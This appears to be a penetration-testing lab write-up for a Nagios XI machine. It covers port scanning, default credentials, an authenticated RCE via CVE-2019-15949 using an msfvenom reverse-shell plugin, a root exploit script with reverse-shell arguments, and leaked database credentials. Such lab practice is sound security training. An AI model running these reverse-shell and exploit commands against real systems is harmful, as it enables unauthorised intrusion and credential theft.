# Monitoring (192.168.171.136)

## Enumeration

### Nmap Results
```text
PORT     STATE SERVICE    REASON         VERSION
22/tcp   open  ssh        syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
25/tcp   open  smtp       syn-ack ttl 61 Postfix smtpd
80/tcp   open  http       syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Nagios XI
389/tcp  open  ldap       syn-ack ttl 61 OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http   syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
5667/tcp open  tcpwrapped syn-ack ttl 61
```

### Web Enumeration
- Title: Nagios XI
- Directory: `/nagios/`, `/nagiosxi/`
- Default Creds Found: `nagiosadmin:admin`

## Exploitation

### Initial Access (Nagios XI Authenticated RCE)
- **CVE**: CVE-2019-15949
- **Method**: Manual plugin upload to `/nagiosxi/admin/monitoringplugins.php`
- **Steps**:
  1. Generate malicious plugin: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.233 LPORT=4444 -f elf -o check_icmp`
  2. Upload as `check_icmp`.
  3. Trigger via web interface.
- **Reverse Shell**:
  ```bash
  nc -nlvp 4444
  nagios@ubuntu:/tmp$ whoami
  nagios
  ```

### Privilege Escalation (Root)
- `sudo -l` shows extensive NOPASSWD permissions.
- **Exploit**: Used NagiosXI Root RCE script (`exploit.php`).
- **Command**: `php exploit.php --host=192.168.171.136 --ssl=false --user=nagiosadmin --pass=admin --reverseip=192.168.45.233 --reverseport=8001`
- **Result**: Root access obtained.

---

## Technical Details

### Database Credentials
- File: `ndo2db.cfg`
- DB User: `ndoutils`
- DB Pass: `n@gweb`

### Exploitation One-Liner
`python3 exploit.py -t http://192.168.171.136/ -b /nagiosxi/ -u nagiosadmin -p nagiosadmin -lh 192.168.45.233 -lp 4444 -k`
